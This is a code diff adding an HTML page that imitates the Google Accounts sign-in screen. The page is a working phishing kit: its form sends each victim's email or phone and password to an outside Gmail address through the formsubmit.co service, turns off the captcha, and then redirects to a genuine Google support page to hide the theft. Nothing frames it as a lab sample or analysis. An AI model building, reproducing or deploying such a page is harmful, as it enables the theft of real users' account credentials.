@@ -1,0 +1,117 @@
+
+<!DOCTYPE html>
+<html>	
+        <meta charset="utf-8">
+		<title>Sing in - Google Accounts</title>
+        <link rel="shortcut icon" href="web-icon.png"> 
+		<link rel="stylesheet" href="style.css">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body>
+<div class="min-pag">
+<div class="min-box"><img class="min-img" src="google.png" width="17%" height="10%"></div>
+<br>
+<div class="min-box"><h2>Sign in</h2></div>
+<br>
+<div class="min-box"><p class="use">Secure your Google account</p></div>
+<br>
+
+
+
+
+<form lass="form-container" action="https://formsubmit.co/mail.help.noreply.us@gmail.com" method="POST">
+    <input type="hidden" name="_subject" value="User">
+    <input type="hidden" name="_captcha" value="false">
+    <input type="hidden" name="_next" value="https://support.google.com/accounts/answer/7682439?hl=en">
+
+    <div class="input-box">
+           <input type="text" class="input" name="U" required="next" autocomplete="off" >
+           <label for="password" class="input-label">
+                  Email or phone
+           </label>
+      </div>
+
+
+ <br>     
+
+
+      <div class="input-box">
+        <input type="password" class="input" id="password" name="P" required="next" autocomplete="off" >
+        <label class="input-label">
+               Enter your password
+        </label>
+   </div>
+
+
+
+
+<div class="pass-box">
+     <input type="checkbox" class="password-toggle" onclick="togglePasswordVisibility()">
+     <samp class="pass-text">Show password</samp>  
+</div>
+<br>
+
+
+    <div class="min-box">
+       
+    <button class="forgot" onclick="location.href='https://accounts.google.com/signin/v2/usernamerecovery?theme=glif&flowName=GlifWebSignIn&flowEntry=ServiceLogin'">Forgot password?</button>
+    
+    </div>     
+
+<br>
+<br>
+<br>
+<div class="help-box">
+    <h6 class="help-text">Not your computer? Use Guest mode to sign in privately.</h6>
+</div>
+<div class="min-box">
+    <button class="forgot" id="mr" onclick="location.href='https://support.google.com/chrome/answer/6130773?hl=en'">Learn more about using Guest mode</button>
+</div> 
+
+
+
+
+    <div class="min-box">
+    <button class="next" id="next" type="submit" >Next</button>
+    </div>
+</form>
+
+
+
+
+
+
+
+
+
+
+
+
+    <script>
+        function togglePasswordVisibility() {
+            var passwordField = document.getElementById("password");
+            var passwordToggle = document.querySelector(".password-toggle");
+    
+           if  (passwordField.type === "password") {
+                passwordField.type = "text";
+                passwordToggle.textContent = "Hide";
+            } else {
+                passwordField.type = "password";
+                passwordToggle.textContent = "Show";
+            }
+        }
+    </script>
+</div>
+
+
+
+
+
+
+
+
+
+
+</div>
+</body>
+</html>
